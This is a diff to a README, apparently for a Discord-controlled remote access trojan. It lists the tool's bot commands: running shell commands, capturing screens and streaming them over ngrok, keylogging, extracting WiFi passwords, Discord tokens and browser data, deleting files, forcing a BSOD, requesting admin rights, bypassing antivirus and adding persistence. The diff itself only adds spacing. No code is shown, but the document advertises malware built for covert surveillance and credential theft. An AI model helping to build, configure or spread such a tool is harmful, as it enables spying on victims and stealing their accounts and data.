@@ -76,43 +76,78 @@ File extension can be modified to:
  ## 📜 Full Command Reference
 
 **Available Commands:**
+
 **System Commands:**
+
 !screen - Capture screenshot
+
 !ip - Get IP address
+
 !clipboard - Show clipboard content
+
 !exec <command> - Run shell command
+
 !shutdown - Shutdown computer
+
 !restart - Restart computer
+
 !bsod - Trigger BSOD (WARNING)
 
+
 **File Operations:**
+
 !ls - List files
+
 !cd <path> - Change directory
+
 !download <file> - Download file
+
 !rm <file> - Delete file
 
+
 **Information Gathering:**
+
 !systeminfo - System information
+
 !cpu - CPU info
+
 !gpu - GPU info
+
 !ram - RAM info
+
 !wifi_passwords - Show WiFi passwords
+
 !recent [browser] - Browser history
+
 !discord - Extract Discord tokens
+
 !browsers - Extract browser data
+
 !live - Start screen streaming (you need to set !key first)
+
 !stop - Stop the stream
+
 !status - Check if stream is running
 
+
 **Other:**
+
 !msg <message> - Show message box
+
 !url <url> - Open URL
+
 !log - Start keylogging
+
 !stoplog - Stop keylogging
+
 !su - Request admin privileges
+
 !avbypass - Bypass antivirus
+
 !persist - Add persistence
+
 !key <your_ngrok_auth_token> - Set your ngrok auth token (get from ngrok.com, easy and free)
+
 
 
 ## 🛠 Discord Bot Setup Guide
